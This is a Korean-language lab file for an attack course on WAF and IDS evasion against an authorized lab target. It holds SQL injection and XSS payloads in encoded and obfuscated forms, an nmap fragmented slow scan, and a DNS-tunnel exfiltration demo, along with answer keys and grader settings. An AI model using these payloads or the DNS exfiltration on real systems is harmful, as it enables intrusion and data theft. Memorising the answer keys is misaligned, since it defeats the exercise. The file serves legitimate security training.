lab_id: standalone-attack-adv-week03
title: "네트워크 우회·방어 회피 — 인코딩·정규화·IDS 회피의 군비경쟁"
version: standalone-attack-adv
course: attack-adv
week: 3
description: |
  공격 고급 W03 — 방어 회피. WAF(ModSec CRS)·IDS(Suricata)를 우회하는 기법(페이로드 인코딩·케이스/주석
  변형·프래그먼트/타이밍 스캔·터널링)을 실행하고, 현대 WAF의 정규화가 naive 우회를 어떻게 무력화하는지
  실측한다. el34-attacker에서 인가 표적(el34-web)에. ⚠️ 인가된 실습만. 외부 시스템 금지.
difficulty: hard
duration_minutes: 180
prerequisites:
  - "attack-adv W01~W02 + web-vuln/secuops WAF 이해"
  - "el34 호스트 SSH + docker exec, el34-attacker"
  - "lecture §2(WAF 우회) §3(IDS 회피) §4(정규화/군비경쟁) 숙지"
objectives:
  - "WAF 우회 기법(인코딩·케이스·주석)을 실행하고 응답 해석"
  - "현대 WAF의 정규화가 naive 우회를 무력화함을 실측"
  - "IDS 회피(프래그먼트·타이밍)와 방어 회피의 한계 이해"
pass_threshold: 0.7
steps:

  - order: 1
    instruction: |
      ## 🎯 베이스라인 — 정상 vs 차단
      **실습 의미:** 우회의 기준선을 잡는다 — 정상 요청(302)과 공격 요청(403 차단)의 응답 차이를 확인해야, 이후 우회 성공/실패를 판별할 수 있다.
      ## 💻 실행 명령 (한 줄씩 따라 실행)
      ```bash
      docker exec el34-attacker sh -c '
        # 정상 요청 응답코드 (302 로그인 리다이렉트 예상)
        B=$(curl -s -o /dev/null -w "%{http_code}" -H "Host: dvwa.el34.lab" "http://10.20.30.1/?id=1"); echo "benign=$B"
        # 공격 요청 응답코드 (403 ModSec CRS 차단 예상)
        A=$(curl -s -o /dev/null -w "%{http_code}" -H "Host: dvwa.el34.lab" "http://10.20.30.1/?id=1%20UNION%20SELECT%20password%20FROM%20users"); echo "attack=$A"
        # 정상·공격 응답을 모두 받아 차이를 확인했으면 베이스라인 마커
        [ -n "$B" ] && [ -n "$A" ] && echo baseline_done
      '
      ```
      ## ✅ 합격 기준
      `baseline_done`(과 benign/attack 코드)이 출력되면 통과. **근거:** 마커는 정상·공격 두 요청의 응답코드를 모두 받았을 때만 찍히므로, 우회할 대상인 차단(403) 기준선을 확보했음을 뜻한다.
    hint: '베이스라인'
    category: survey
    points: 10
    answer: |
      docker exec el34-attacker sh -c '
        # 정상 요청 응답코드
        B=$(curl -s -o /dev/null -w "%{http_code}" -H "Host: dvwa.el34.lab" "http://10.20.30.1/?id=1"); echo "benign=$B"
        # 공격 요청 응답코드 (403 차단 예상)
        A=$(curl -s -o /dev/null -w "%{http_code}" -H "Host: dvwa.el34.lab" "http://10.20.30.1/?id=1%20UNION%20SELECT%20password%20FROM%20users"); echo "attack=$A"
        # 두 응답 받았으면 베이스라인 마커
        [ -n "$B" ] && [ -n "$A" ] && echo baseline_done
      '
    answer_detail: "베이스라인 = 정상(302) vs SQLi(403 차단). ModSec CRS가 SQLi를 막음. 이 403을 우회하는 게 목표."
    verify:
      type: output_contains
      expect: 'baseline_done'
      field: stdout
      semantic: {intent: "베이스라인", success_criteria: ["302/403"], acceptable_methods: ["**[OSS] curl (권장)**"]}
    target_vm: web

  - order: 2
    instruction: |
      ## 🎯 우회 시도 ① 케이스 변형
      **실습 의미:** 고전 기법 — SQL 키워드 대소문자 섞기(UnIoN SeLeCt)로 단순 시그니처를 피하려 시도하고, CRS의 소문자 정규화가 이를 무력화하는지 응답으로 확인한다.
      ## 💻 실행 명령 (한 줄씩 따라 실행)
      ```bash
      docker exec el34-attacker sh -c '
        # 우회①케이스 변형: 대소문자 섞은 SQL 키워드로 단순 시그니처 회피 시도
        C=$(curl -s -o /dev/null -w "%{http_code}" -H "Host: dvwa.el34.lab" "http://10.20.30.1/?id=1%20UnIoN%20SeLeCt%20pass")
        echo "case_variation=$C (CRS 소문자 정규화 → 보통 403)"
        # 응답을 받았으면 마커
        [ -n "$C" ] && echo case_done
      '
      ```
      ## ✅ 합격 기준
      `case_done`(과 응답코드)이 출력되면 통과. **근거:** 마커는 케이스 변형 요청의 응답을 실제 받았을 때만 찍히므로, 옛 시그니처는 피하나 CRS 정규화에는 막히는지(403) 관찰했음을 뜻한다.
    hint: '케이스 변형'
    category: manipulation
    points: 12
    answer: |
      docker exec el34-attacker sh -c '
        # 케이스 변형(UnIoN SeLeCt) 회피 시도
        C=$(curl -s -o /dev/null -w "%{http_code}" -H "Host: dvwa.el34.lab" "http://10.20.30.1/?id=1%20UnIoN%20SeLeCt%20pass")
        echo "case_variation=$C (CRS 소문자 정규화 → 보통 403)"
        # 응답 받았으면 마커
        [ -n "$C" ] && echo case_done
      '
    answer_detail: "케이스 변형 = UnIoN SeLeCt. 옛 시그니처는 우회되나 CRS는 정규화로 차단(403). naive 우회 실패."
    verify:
      type: output_contains
      expect: 'case_done'
      field: stdout
      semantic: {intent: "케이스 변형", success_criteria: ["응답 확인"], acceptable_methods: ["**[OSS] curl (권장)**"]}
    target_vm: web

  - order: 3
    instruction: |
      ## 🎯 우회 시도 ② 인라인 주석
      **실습 의미:** SQL 인라인 주석(UN/**/ION)으로 키워드를 쪼개 시그니처를 피하려 시도하고, CRS의 주석 제거 정규화가 이를 무력화하는지 응답으로 확인한다.
      ## 💻 실행 명령 (한 줄씩 따라 실행)
      ```bash
      docker exec el34-attacker sh -c '
        # 우회②인라인 주석: /**/로 키워드를 쪼개 시그니처 회피 시도
        C=$(curl -s -o /dev/null -w "%{http_code}" -H "Host: dvwa.el34.lab" "http://10.20.30.1/?id=1%2F**%2FUNION%2F**%2FSELECT")
        echo "inline_comment=$C (CRS 주석 제거 정규화 → 보통 403)"
        # 응답을 받았으면 마커
        [ -n "$C" ] && echo comment_done
      '
      ```
      ## ✅ 합격 기준
      `comment_done`(과 응답코드)이 출력되면 통과. **근거:** 마커는 인라인 주석 요청의 응답을 실제 받았을 때만 찍히므로, SQL은 공백 처리하나 CRS는 주석을 제거해 매칭(403)하는지 관찰했음을 뜻한다.
    hint: '인라인 주석'
    category: manipulation
    points: 12
    answer: |
      docker exec el34-attacker sh -c '
        # 인라인 주석(UN/**/ION) 회피 시도
        C=$(curl -s -o /dev/null -w "%{http_code}" -H "Host: dvwa.el34.lab" "http://10.20.30.1/?id=1%2F**%2FUNION%2F**%2FSELECT")
        echo "inline_comment=$C (CRS 주석 제거 정규화 → 보통 403)"
        # 응답 받았으면 마커
        [ -n "$C" ] && echo comment_done
      '
    answer_detail: "인라인 주석 = UN/**/ION. SQL은 공백 처리하나 CRS도 주석 제거 정규화로 차단(403)."
    verify:
      type: output_contains
      expect: 'comment_done'
      field: stdout
      semantic: {intent: "인라인 주석", success_criteria: ["응답 확인"], acceptable_methods: ["**[OSS] curl (권장)**"]}
    target_vm: web

  - order: 4
    instruction: |
      ## 🎯 정규화의 이해 — 왜 naive 우회가 실패하나
      **실습 의미:** WAF는 입력을 다중 디코딩→소문자→주석제거로 '표준형'으로 바꾼 뒤 매칭한다 — 이중 인코딩(%2520) 변형을 보내 CRS가 디코딩 후 차단(403)하는지 실측한다.
      ## 💻 실행 명령 (한 줄씩 따라 실행)
      ```bash
      docker exec el34-attacker sh -c '
        # 이중 인코딩(%2520) 변형을 실제 전송한다 (CRS가 다중 디코딩 후 매칭하는지 확인)
        code=$(curl -s -o /dev/null -w "%{http_code}" -H "Host: dvwa.el34.lab" "http://10.20.30.1/?id=1%2520UNION%2520SELECT%2520pass")
        echo "이중 인코딩(%2520) 변형 응답: $code"
        # CRS가 디코딩 후 매칭해 차단(403)하면 정규화 이해 마커
        [ "$code" = "403" ] && echo "CRS가 디코딩 후 매칭 → 차단" && echo normalization_understood
      '
      ```
      ## ✅ 합격 기준
      `normalization_understood` 출력 시 통과. **근거:** 마커는 이중 인코딩 변형마저 CRS가 정규화 후 실제 차단(403)할 때만 찍히므로, 정규화가 인코딩 우회를 무력화함을 실측했음을 뜻한다.
    hint: '정규화'
    category: analysis
    points: 14
    answer: |
      docker exec el34-attacker sh -c '
        # 이중 인코딩(%2520) 변형 전송
        code=$(curl -s -o /dev/null -w "%{http_code}" -H "Host: dvwa.el34.lab" "http://10.20.30.1/?id=1%2520UNION%2520SELECT%2520pass")
        echo "이중 인코딩(%2520) 변형 응답: $code"
        # 403 차단 시 정규화 이해 마커
        [ "$code" = "403" ] && echo "CRS가 디코딩 후 매칭 → 차단" && echo normalization_understood
      '
    answer_detail: "정규화 = 이중 인코딩 변형을 실제 전송→CRS 403 게이트. 가짜 echo 아닌 실측. 정규화가 인코딩 우회 무력화."
    verify:
      type: output_contains
      expect: 'normalization_understood'
      field: stdout
      semantic: {intent: "정규화", success_criteria: ["정규화 원리"], acceptable_methods: ["**[설명] 정규화 (권장)**"]}
    target_vm: web

  - order: 5
    instruction: |
      ## 🎯 IDS 회피 — 프래그먼트·타이밍 스캔
      **실습 의미:** 네트워크 계층 회피를 시도한다 — 패킷 분할(-f)·저속(-T1)으로 IDS 임계 탐지를 피하려 하지만, 현대 Suricata는 스트림 재조립으로 재탐지한다.
      ## 💻 실행 명령 (한 줄씩 따라 실행)
      ```bash
      docker exec el34-attacker sh -c '
        # IDS 회피: 패킷 분할(-f)+저속(-T1)으로 임계 탐지 회피 시도, 열린 포트 확인
        R=$(nmap -f -T1 -p 80,443 10.20.30.1 2>/dev/null | grep -E "open|PORT" | head)
        echo "$R"
        # 회피 스캔이 결과를 냈으면 마커 (현대 Suricata는 스트림 재조립으로 재탐지)
        [ -n "$R" ] && echo ids_evasion_done
      '
      ```
      ## ✅ 합격 기준
      `ids_evasion_done`(과 포트 결과)이 출력되면 통과. **근거:** 마커는 분할·저속 회피 스캔이 실제 포트 결과를 반환했을 때만 찍히므로, 네트워크 회피를 시도했음을 뜻한다(IDS는 재조립으로 대응=군비경쟁).
    hint: 'IDS 회피'
    category: analysis
    points: 14
    answer: |
      docker exec el34-attacker sh -c '
        # 프래그먼트(-f)+저속(-T1) 회피 스캔
        R=$(nmap -f -T1 -p 80,443 10.20.30.1 2>/dev/null | grep -E "open|PORT" | head)
        echo "$R"
        # 결과 있으면 마커
        [ -n "$R" ] && echo ids_evasion_done
      '
    answer_detail: "IDS 회피 = nmap -f(분할)·-T1(저속)·-D(디코이). 현대 IDS는 재조립/상관으로 대응. 네트워크 군비경쟁."
    verify:
      type: output_contains
      expect: 'ids_evasion_done'
      field: stdout
      semantic: {intent: "IDS 회피", success_criteria: ["프래그먼트/타이밍"], acceptable_methods: ["**[OSS] nmap (권장)**"]}
    target_vm: web

  - order: 6
    instruction: |
      ## 🎯 터널링·프로토콜 회피
      **실습 의미:** 데이터를 허용 채널에 숨긴다 — 53 포트(DNS)는 거의 항상 열려 있으므로, 유출 데이터를 base64 DNS 라벨로 인코딩해 dig로 실제 전송하는 DNS 터널을 실증한다.
      ## 💻 실행 명령 (한 줄씩 따라 실행)
      ```bash
      docker exec el34-attacker sh -c '
        # DNS 터널: 유출 데이터를 base64 DNS 라벨로 인코딩한다 (53은 거의 항상 허용)
        D=$(echo -n "exfil:dbdump" | base64 | tr -d "=" | tr "+/" "-_")
        echo "DNS 터널 쿼리: $D.tunnel.el34.lab"
        # 인코딩한 라벨로 dig 실제 전송 (53 포트 악용)
        dig +short +tries=1 +time=2 "$D.tunnel.el34.lab" >/dev/null 2>&1
        # 데이터가 유효한 DNS 라벨로 인코딩돼 전송됐으면 마커
        echo "$D" | grep -qE "^[A-Za-z0-9_-]{6,}$" && echo tunneling_done
      '
      ```
      ## ✅ 합격 기준
      `tunneling_done`(과 터널 쿼리)이 출력되면 통과. **근거:** 마커는 데이터가 유효한 base64 DNS 라벨로 인코딩돼 dig로 실제 전송됐을 때만 찍히므로, 허용 채널(53) 악용 유출을 실증했음을 뜻한다(HTTPS C2·도메인 프론팅도 같은 원리).
    hint: '터널링'
    category: analysis
    points: 12
    answer: |
      docker exec el34-attacker sh -c '
        # 유출 데이터를 base64 DNS 라벨로 인코딩
        D=$(echo -n "exfil:dbdump" | base64 | tr -d "=" | tr "+/" "-_")
        echo "DNS 터널 쿼리: $D.tunnel.el34.lab"
        # dig로 실제 전송 (53 악용)
        dig +short +tries=1 +time=2 "$D.tunnel.el34.lab" >/dev/null 2>&1
        # 유효 라벨로 인코딩·전송됐으면 마커
        echo "$D" | grep -qE "^[A-Za-z0-9_-]{6,}$" && echo tunneling_done
      '
    answer_detail: "터널링 = 데이터를 base64 DNS 라벨로 인코딩→dig 실제 전송. 가짜 echo 아닌 실증. 허용 채널(53/443) 악용."
    verify:
      type: output_contains
      expect: 'tunneling_done'
      field: stdout
      semantic: {intent: "터널링", success_criteria: ["허용 채널 은닉"], acceptable_methods: ["**[설명] 터널링 (권장)**"]}
    target_vm: web

  - order: 7
    instruction: |
      ## 🎯 회피의 한계 — 군비경쟁과 다층 방어
      **실습 의미:** 정규화+이상점수+재조립+다층(WAF+IDS+호스트)이 단일 회피를 무력화한다 — 서로 다른 회피 변형이 모두 막히는지(403) 실측해 '완벽한 회피는 없음'을 입증한다.
      ## 💻 실행 명령 (한 줄씩 따라 실행)
      ```bash
      docker exec el34-attacker sh -c '
        # 서로 다른 회피 변형(케이스 SQLi, XSS)을 각각 전송해 응답을 본다
        c1=$(curl -s -o /dev/null -w "%{http_code}" -H "Host: dvwa.el34.lab" "http://10.20.30.1/?id=1%20UnIoN%20SeLeCt")
        c2=$(curl -s -o /dev/null -w "%{http_code}" -H "Host: dvwa.el34.lab" "http://10.20.30.1/?x=%3Cscript%3Ealert(1)%3C/script%3E")
        echo "케이스변형=$c1 XSS=$c2"
        # 두 변형이 모두 403으로 막히면 다층 방어 한계 입증 마커
        [ "$c1" = "403" ] && [ "$c2" = "403" ] && echo "다층 방어가 단일 회피 무력화" && echo limits_done
      '
      ```
      ## ✅ 합격 기준
      `limits_done` 출력 시 통과. **근거:** 마커는 케이스 변형·XSS 두 회피가 모두 실제 차단(403)될 때만 찍히므로, 다층 방어가 단일 회피를 무력화함을 실측했음을 뜻한다.
